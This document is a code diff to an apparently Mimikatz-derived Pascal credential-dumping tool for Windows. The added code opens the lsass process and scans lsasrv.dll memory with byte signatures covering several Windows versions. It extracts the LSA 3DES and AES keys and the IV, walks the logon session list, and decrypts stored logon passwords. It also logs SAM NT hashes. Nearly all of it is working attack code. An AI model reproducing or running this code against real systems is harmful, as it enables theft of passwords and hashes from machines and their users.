@@ -8,7 +8,7 @@ uses windows, classes, sysutils, dos, usamlib, usid, upsapi, uimagehlp,
 
 
 
-
+{$ifdef CPU64}
 type i_logsesslist=record
      next:nativeuint;
      prev:nativeuint;
@@ -22,7 +22,80 @@ type i_logsesslist=record
      domainptr:nativeuint;
      passwordptr:nativeuint; //??
      end;
+  {$endif CPU64}
 
+  {$ifdef CPU32}
+  //works at least on win7 32 bits...
+  type i_logsesslist=record
+       next:nativeuint;
+       prev:nativeuint;
+       usagecount:nativeuint;
+       this:nativeuint;
+       luid:nativeuint;
+       unk1:nativeuint;
+       unk2:nativeuint;
+       unk3:nativeuint;
+       //minmax1:nativeuint;
+       min1:word;
+       max1:word;
+       usernameptr:nativeuint;
+       //minmax2:nativeuint;
+       min2:word;
+       max2:word;
+       domainptr:nativeuint;
+       //minmax3:nativeuint;
+       min3:word;
+       max3:word;
+       passwordptr:nativeuint; //??
+       end;
+    {$endif CPU32}
+
+    _KIWI_HARD_KEY =record
+	cbSecret:ULONG;
+	data:array[0..59] of byte // etc...
+    end;
+ KIWI_HARD_KEY=_KIWI_HARD_KEY;
+
+ _KIWI_BCRYPT_KEY =record
+ 	size:ULONG;
+ 	tag:array [0..3] of char;	// 'MSSK'
+ 	type_:ULONG;
+ 	unk0:ULONG;
+ 	unk1:ULONG;
+ 	bits:ULONG;
+ 	hardkey:KIWI_HARD_KEY;
+        end;
+  KIWI_BCRYPT_KEY=_KIWI_BCRYPT_KEY;
+  PKIWI_BCRYPT_KEY=^KIWI_BCRYPT_KEY;
+
+     _KIWI_BCRYPT_KEY81 =record
+	 size:ulong;
+	 tag:array [0..3] of char;	// 'MSSK'
+	 type_:ulong;
+	 unk0:ulong;
+	 unk1:ulong;
+	 unk2:ulong;
+	 unk3:ulong;
+	 unk4:ulong;
+	 unk5:pointer;	// before, align in x64
+	 unk6:ulong;
+	 unk7:ulong;
+	 unk8:ulong;
+	 unk9:ulong;
+         //
+	 hardkey:KIWI_HARD_KEY;
+        end;
+     KIWI_BCRYPT_KEY81=_KIWI_BCRYPT_KEY81 ;
+     PKIWI_BCRYPT_KEY81=^KIWI_BCRYPT_KEY81;
+
+     _KIWI_BCRYPT_HANDLE_KEY =record
+	size:ulong;
+	tag:array [0..3] of char;	// 'UUUR'
+	hAlgorithm:pointer;
+	key:pointer; // PKIWI_BCRYPT_KEY81; or PKIWI_BCRYPT_KEY; depending on OS...
+	unk0:pointer;
+        end;
+     KIWI_BCRYPT_HANDLE_KEY=_KIWI_BCRYPT_HANDLE_KEY;
 
 
 const
@@ -38,7 +111,219 @@ var
   mystringsid:pchar;
   winver,osarch:string;
   sysdir:pchar;
-  syskey,samkey,nthash:tbyte16;
+  syskey,samkey,ntlmhash:tbyte16;
+  deskey,aeskey,iv:tbytes;
+
+
+function decryptLSA(cbmemory:ulong;encrypted:array of byte):boolean;
+const
+  BCRYPT_AES_ALGORITHM                    = 'AES';
+  BCRYPT_DES_ALGORITHM                    = 'DES';
+var
+  cbIV:ulong;
+  status:ntstatus;
+begin
+  if (cbMemory mod 8)=0 then     //multiple of 8
+	begin
+		//hKey = &kAes.hKey;
+		cbIV := sizeof(iv);
+                status:=bdecrypt(BCRYPT_AES_ALGORITHM,@encrypted,cbmemory ,@aeskey[0],@iv[0]);
+                log('aes status:'+inttohex (status,sizeof(status)));
+                log('aes decrypted:'+HashByteToString (encrypted));
+        end
+	else
+	begin
+		//hKey = &k3Des.hKey;
+		cbIV := sizeof(iv) div 2;
+                status:=bdecrypt(BCRYPT_DES_ALGORITHM,@encrypted,cbmemory ,@deskey[0],@iv[0]);
+                log('des status:'+inttohex (status,sizeof(status)));
+                log('des decrypted:'+HashByteToString (encrypted));
+        end;
+
+end;
+
+//dd lsasrv!h3DesKey
+//dd lsasrv!hAesKey
+//dd lsasrv!InitializationVector
+
+function findlsakeys(pid:dword;var DesKey,aeskey,iv:tbytes):boolean;
+const
+ //win7
+ PTRN_WNO8_LsaInitializeProtectedMemory_KEY:array[0..12] of byte=  ($83, $64, $24, $30, $00, $44, $8b, $4c, $24, $48, $48, $8b, $0d);
+ PTRN_WIN8_LsaInitializeProtectedMemory_KEY:array[0..11] of byte=  ($83, $64, $24, $30, $00, $44, $8b, $4d, $d8, $48, $8b, $0d);
+ //KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),	PTRN_WIN8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {62, -70, 23}},
+ PTRN_WN10_LsaInitializeProtectedMemory_KEY:array[0..15] of byte=  ($83, $64, $24, $30, $00, $48, $8d, $45, $e0, $44, $8b, $4d, $d8, $48, $8d, $15);
+ PTRN_WALL_LsaInitializeProtectedMemory_KEY_X86:array[0..4]  of byte=  ($6a, $02, $6a, $10, $68);
+var
+pattern:array of byte;
+ IV_OFFSET:ShortInt ; //signed byte
+ DES_OFFSET:ShortInt ; //signed byte
+ AES_OFFSET:ShortInt ; //signed byte
+ hmod:thandle=0;
+ MODINFO:  MODULEINFO;
+ keySigOffset:nativeuint;
+ hprocess:thandle=0;
+ hmods:array[0..1023] of thandle;
+ cbneeded,count:dword;
+ szModName:array[0..254] of char;
+ dummy:string;
+ lsasrvMem:nativeuint;
+ ivOffset,desOffset,aesOffset,keyPointer:nativeuint;
+ iv_:tbyte16;
+ h3DesKey, hAesKey:KIWI_BCRYPT_HANDLE_KEY;
+ extracted3DesKey, extractedAesKey:KIWI_BCRYPT_KEY;
+ extracted3DesKey81, extractedAesKey81:KIWI_BCRYPT_KEY81;
+ //extracted3DesKey:pointer;
+ i:byte;
+begin
+  result:=false;
+  // OS detection
+if lowercase(osarch) ='x86' then
+   begin
+   setlength(pattern,5);
+   CopyMemory(@pattern[0],@PTRN_WALL_LsaInitializeProtectedMemory_KEY_X86[0],5);
+   IV_OFFSET:=5 ; DES_OFFSET:=-76 ; AES_OFFSET:=-21 ;
+   end;
+if lowercase(osarch) ='amd64' then
+   begin
+   if copy(winver,1,3)='6.0' then //win7
+      begin
+      setlength(pattern,sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY));
+      CopyMemory(@pattern[0],@PTRN_WNO8_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY));
+      IV_OFFSET := 59; DES_OFFSET := -61; AES_OFFSET := 25;
+      end;
+   if copy(winver,1,3)='6.3' then //win8
+      begin
+      setlength(pattern,sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY));
+      CopyMemory(@pattern[0],@PTRN_WIN8_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY));
+      IV_OFFSET:=62 ; DES_OFFSET:=-70 ; AES_OFFSET:=23 ;
+      end;
+   if copy(winver,1,3)='10.' then //win10
+      begin
+      setlength(pattern,sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
+      CopyMemory(@pattern[0],@PTRN_WN10_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
+      IV_OFFSET:=62 ; DES_OFFSET:=-70 ; AES_OFFSET:=23 ;
+      end;
+   end;
+//*************************
+hmod:=loadlibrary('lsasrv.dll');
+log('hMod:'+inttohex(hmod,sizeof(pointer)),0);
+fillchar(MODINFO,sizeof(MODINFO),0);
+GetModuleInformation (getcurrentprocess,hmod,MODINFO ,sizeof(MODULEINFO));
+//lets search keySigOffset "offline" i.e NOT in lsass.exe
+keySigOffset:=SearchMem(getcurrentprocess,MODINFO.lpBaseOfDll ,MODINFO.SizeOfImage,pattern);
+log('keySigOffset:'+inttohex(keySigOffset,sizeof(pointer)),0);
+hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+                                      false,pid);
+
+lsasrvMem:=0;
+EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded);
+for count:=0 to cbneeded div sizeof(thandle) do
+    begin
+      GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) );
+      dummy:=lowercase(strpas(szModName ));
+      //writeln(dummy);
+      if pos('lsasrv.dll',dummy)>0 then begin lsasrvMem:=hMods[count];break;end;
+    end;
+if lsasrvMem=0 then exit;
+//writeln('sizeof(pointer):'+inttostr(sizeof(pointer)));
+//writeln('sizeof(nativeuint):'+inttostr(sizeof(nativeuint)));
+// Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
+ivOffset:=0;
+ReadMem(hprocess, keySigOffset + IV_OFFSET, @ivOffset, 4);
+{$ifdef CPU64}
+ivOffset:=keySigOffset + IV_OFFSET+ivOffset+4;
+{$endif CPU64}
+//will match dd lsasrv!InitializationVector
+log('IV_OFFSET:'+inttohex(ivOffset,sizeof(pointer)),0);
+ReadMem(hprocess, ivoffset, @iv_, sizeof(iv_));
+log('IV:'+HashByteToString (IV_),0);
+setlength(iv,sizeof(iv_));
+CopyMemory(@iv[0],@iv_[0],sizeof(iv_));
+
+//keySigOffset:7FFEEE887696
+//target :     7ffeee94d998
+//delta : 0C6302 // found : 44 63 0c 00
+//keySigOffset + DES_OFFSET = 7FFEEE887650 //DES_OFFSET:=-70
+
+//7FFEEE94D9DA
+
+// Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
+desOffset:=0;
+ReadMem(hprocess, keySigOffset + DES_OFFSET, @desOffset, 4);
+{$ifdef CPU64}
+desOffset:=keySigOffset + DES_OFFSET+desOffset+4;
+{$endif CPU64}
+//will match dd lsasrv!h3DesKey
+log('DES_OFFSET:'+inttohex(desOffset,sizeof(pointer)));
+// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
+if ReadMem(hprocess, desOffset, @keyPointer, sizeof(keyPointer))=false then writeln('readmem=false');
+//writeln('keyPointer:'+inttohex(keyPointer,sizeof(pointer)));
+// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
+if ReadMem(hprocess, keyPointer, @h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY))=false then writeln('readmem=false');
+//writeln('TAG:'+strpas(h3DesKey.tag ));
+// Read in the 3DES key
+log('DES:');
+if winver='6.3.9600' then
+   begin
+   //extracted3DesKey:=allocmem(sizeof(KIWI_BCRYPT_KEY81)); //we could for a pointer and then typecast
+   //writeln('h3DesKey.key:'+inttohex(nativeuint(h3DesKey.key),sizeof(pointer)));
+   if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
+   //writeln('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
+   //writeln('hardkey cbSecret:'+inttostr(extracted3DesKey81.hardkey.cbSecret   ));
+   //for i:=0 to extracted3DesKey81.hardkey.cbSecret -1 do write(inttohex(extracted3DesKey81.hardkey.data[i],2));;
+   setlength(DesKey ,extracted3DesKey81.hardkey.cbSecret);
+   copymemory(@DesKey [0],@extracted3DesKey81.hardkey.data[0],extracted3DesKey81.hardkey.cbSecret);
+   log(HashByteToString(deskey));
+   end
+   else
+   begin
+   if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey, sizeof(KIWI_BCRYPT_KEY))=false then writeln('readmem=false');
+   //for i:=0 to extracted3DesKey.hardkey.cbSecret -1 do write(inttohex(extracted3DesKey.hardkey.data[i],2));;
+   setlength(DesKey ,extracted3DesKey.hardkey.cbSecret);
+   copymemory(@DesKey [0],@extracted3DesKey.hardkey.data[0],extracted3DesKey.hardkey.cbSecret);
+   log(HashByteToString(deskey));
+   end;
+
+// Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
+aesOffset:=0;
+ReadMem(hprocess, keySigOffset + AES_OFFSET, @aesOffset, 4);
+{$ifdef CPU64}
+aesOffset:=keySigOffset + AES_OFFSET+aesOffset+4;
+{$endif CPU64}
+//will match dd lsasrv!hAesKey
+log('AES_OFFSET:'+inttohex(aesOffset,sizeof(pointer)));
+// Retrieve pointer to h3AesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
+ReadMem(hprocess, aesOffset, @keyPointer, sizeof(nativeuint));
+// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
+ReadMem(hprocess, keyPointer, @hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
+// Read in AES key
+log('AES:');
+
+if winver='6.3.9600' then
+   begin
+   //extracted3DesKey:=allocmem(sizeof(KIWI_BCRYPT_KEY81)); //we could for a pointer and then typecast
+   //writeln('h3DesKey.key:'+inttohex(nativeuint(h3DesKey.key),sizeof(pointer)));
+   if ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
+   //writeln('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
+   //writeln('hardkey cbSecret:'+inttostr(extracted3DesKey81.hardkey.cbSecret   ));
+   //for i:=0 to extractedAesKey81.hardkey.cbSecret -1 do write(inttohex(extractedAesKey81.hardkey.data[i],2));;
+   setlength(aesKey ,extractedAesKey81.hardkey.cbSecret);
+   copymemory(@aesKey [0],@extractedAesKey81.hardkey.data[0],extractedAesKey81.hardkey.cbSecret);
+   log(HashByteToString(aesKey));
+   end
+   else
+   begin
+   ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey, sizeof(KIWI_BCRYPT_KEY));
+   //for i:=0 to extractedAesKey.hardkey.cbSecret -1 do write(inttohex(extractedAesKey.hardkey.data[i],2));;
+   setlength(aesKey ,extractedAesKey.hardkey.cbSecret);
+   copymemory(@aesKey [0],@extractedAesKey.hardkey.data[0],extractedAesKey.hardkey.cbSecret);
+   log(HashByteToString(aesKey));
+   end;
+
+result:=true;
+
+end;
 
 //********************************************************************************
 function callback_QueryUsers(param:pointer=nil):dword;stdcall;
@@ -282,6 +567,7 @@ begin
 end;
 
 
+
 //check kuhl_m_sekurlsa_utils.c
 function dumplogons(pid:dword;module:string):boolean;
 const
@@ -292,9 +578,14 @@ const
   // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
   PTRN_WIN5_PasswdSet:array [0..3] of byte=  ($48, $3b, $da, $74);
   PTRN_WIN6_PasswdSet:array [0..3] of byte=  ($48, $3b, $d9, $74);
-  PTRN_WIN5_PasswdSet_X86:array [0..6] of byte= ($74, $18, $8b, $4d, $08, $8b, $11);
+  //x86
+  PTRN_WIN5_PasswdSet_X86:array    [0..6] of byte= ($74, $18, $8b, $4d, $08, $8b, $11);
+  PTRN_WIN6_PasswdSet_X86:array    [0..6] of byte= ($74, $11, $8b, $0b, $39, $4e, $10);
+  PTRN_WIN63_PasswdSet_X86:array   [0..6] of byte= ($74, $15, $8b, $0a, $39, $4e, $10);
+  PTRN_WIN64_PasswdSet_X86:array   [0..6] of byte= ($74, $15, $8b, $0f, $39, $4e, $10);
+  PTRN_WIN1809_PasswdSet_X86:array [0..6] of byte= ($74, $15, $8b, $17, $39, $56, $10);
 var
-  dummy,temp:string;
+  dummy:string;
   hprocess,hmod:thandle;
   hmods:array[0..1023] of thandle;
   MODINFO:  MODULEINFO;
@@ -309,6 +600,7 @@ var
   pattern:array of byte;
   logsesslist:array [0..sizeof(i_logsesslist)-1] of byte;
   bytes:array[0..254] of byte;
+  password:tbytes;
   username:array [0..254] of widechar;
 begin
   if pid=0 then exit;
@@ -337,8 +629,16 @@ begin
      end;
   if (lowercase(osarch)='x86') then
      begin
-        setlength(pattern,sizeof(PTRN_WIN5_PasswdSet_X86));
-        copymemory(@pattern[0],@PTRN_WIN5_PasswdSet_X86[0],sizeof(PTRN_WIN5_PasswdSet_X86));
+        setlength(pattern,7);
+          if copy(winver,1,3)='5.1' then copymemory(@pattern[0],@PTRN_WIN5_PasswdSet_X86[0],7);
+          //vista - 6.0
+          if (copy(winver,1,3)='6.0')
+             or (copy(winver,1,3)='6.1')
+             or (copy(winver,1,3)='6.2') then copymemory(@pattern[0],@PTRN_WIN6_PasswdSet_X86[0],7);
+          //win 8.1 6.3
+          if copy(winver,1,3)='6.3' then copymemory(@pattern[0],@PTRN_WIN63_PasswdSet_X86[0],7);
+          //generic for now
+          patch_pos:=-6;
      end;
 
   if patch_pos =0 then
@@ -384,33 +684,54 @@ begin
                                  if ReadMem  (hprocess,offset+patch_pos,offset_list) then
                                    begin
                                    CopyMemory(@offset_list_dword,@offset_list[0],4);
-                                   log('ReadProcessMemory OK '+inttohex(offset_list_dword+4,4));
+                                   log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
                                    //we now should get a match with .load lsrsrv.dll then dd Lsasrv!LogonSessionList
                                    //new offset to the list entry
+                                   {$ifdef CPU64}
                                    offset:= offset+offset_list_dword+4+patch_pos;
-                                   log(leftpad(inttohex(offset,sizeof(pointer)),16,'0'),1);
-                                   //writeln(strtoint64('$'+leftpad(inttohex(offset,sizeof(pointer)),16,'0')));
+                                   {$endif CPU64}
+                                   {$ifdef CPU32}
+                                   offset:= offset_list_dword{+patch_pos};
+                                   {$endif CPU32}
+                                   log(leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),1);
                                    //read sesslist at offset
                                    ReadMem  (hprocess,offset,logsesslist );
+                                   {$ifdef CPU32}
+                                   dummy:=inttohex(i_logsesslist (logsesslist ).next,sizeof(pointer));
+                                   {$endif CPU32}
                                    {$ifdef CPU64}
-                                   dummy:=inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).highPart,sizeof(pointer))+inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).LowPart ,sizeof(pointer));
+                                   //dummy:=inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).highPart,sizeof(pointer))+inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).LowPart ,sizeof(pointer));
+                                   dummy:=inttohex(i_logsesslist (logsesslist).next,sizeof(pointer));
                                    {$endif CPU64}
                                    //again...
-                                   while dummy<>leftpad(inttohex(offset,sizeof(pointer)),16,'0') do
+                                   //while dummy<>leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0') do
+                                   while dummy<>inttohex(offset,sizeof(pointer)) do
                                    begin
-                                   log('entry#n:'+dummy,0) ;
+                                   log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
+                                   log('entry#next:'+dummy,0) ;
+                                   log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount)) ;
                                    //get username and luid
-                                   {$ifdef CPU64}
-                                   temp:=inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).usernameptr).highPart,sizeof(pointer))+inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).usernameptr).LowPart ,sizeof(pointer));
-                                   {$endif CPU64}
-                                   ReadMem  (hprocess,strtoint64('$'+temp),bytes );
+                                   ReadMem  (hprocess,i_logsesslist (logsesslist ).usernameptr,bytes );
                                    copymemory(@username[0],@bytes[0],64);
                                    log('username:'+widestring(username));
+                                   log('pwdlen:'+inttostr(i_logsesslist (logsesslist ).min3)) ;
+                                   if i_logsesslist (logsesslist ).min3>0 then
+                                     begin
+                                     setlength(password,i_logsesslist (logsesslist ).min3);
+                                     ReadMem  (hprocess,i_logsesslist (logsesslist ).passwordptr ,@password[0],i_logsesslist (logsesslist ).min3 );
+                                     log('encrypted password:'+HashByteToString (password));
+                                     decryptLSA (i_logsesslist (logsesslist ).min3,password);
+                                     end;
+                                   //decryptcreds;
                                    //next
-                                   ReadMem  (hprocess,strtoint64('$'+dummy),logsesslist );
+                                   ReadMem  (hprocess,i_logsesslist (logsesslist).next,logsesslist );
                                    {$ifdef CPU64}
-                                   dummy:=inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).highPart,sizeof(pointer))+inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).LowPart ,sizeof(pointer));
-                                    {$endif CPU64}
+                                   //dummy:=inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).highPart,sizeof(pointer))+inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).LowPart ,sizeof(pointer));
+                                   dummy:=inttohex(i_logsesslist (logsesslist).next,sizeof(pointer));
+                                   {$endif CPU64}
+                                    {$ifdef CPU32}
+                                    dummy:=inttohex(i_logsesslist (logsesslist ).next,sizeof(pointer));
+                                    {$endif CPU32}
                                    end;
                                    //...
 
@@ -473,6 +794,7 @@ var
   username:string;
 begin
   try
+  fillchar(bytes,sizeof(bytes),0);
   if dumphash(psamuser(param).samkey,psamuser(param).rid,bytes,username)
           then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+HashByteToString(bytes) ,1)
           else log('gethash NOT OK for '+inttohex(psamuser(param).rid,8)+':'+username ,1);
@@ -555,6 +877,17 @@ begin
   //enum_samusers(samkey);
   //exit;
   //
+  p:=pos('/findlsakeys',cmdline);
+  if p>0 then
+     begin
+     if findlsakeys (lsass_pid,deskey,aeskey,iv ) then
+        begin
+        log('IV:'+HashByteToString (iv),1);
+        log('DESKey:'+HashByteToString (deskey),1);
+        log('AESKey:'+HashByteToString (aeskey),1);
+        end;
+     exit;
+     end;
   p:=pos('/dumplogons',cmdline);
   if p>0 then
      begin
@@ -637,8 +970,8 @@ begin
            then
               begin
               log('SAMKey:'+HashByteToString(samkey) ,1);
-              if dumphash(samkey,strtoint(rid),nthash,user)
-                 then log('NTHASH:'+user+':'+rid+'::'+HashByteToString(nthash) ,1)
+              if dumphash(samkey,strtoint(rid),ntlmhash,user)
+                 then log('NTHASH:'+user+':'+rid+'::'+HashByteToString(ntlmhash) ,1)
                  else log('gethash NOT OK' ,1);
               end //if getsamkey(syskey,samkey)
            else log('getsamkey NOT OK' ,1);
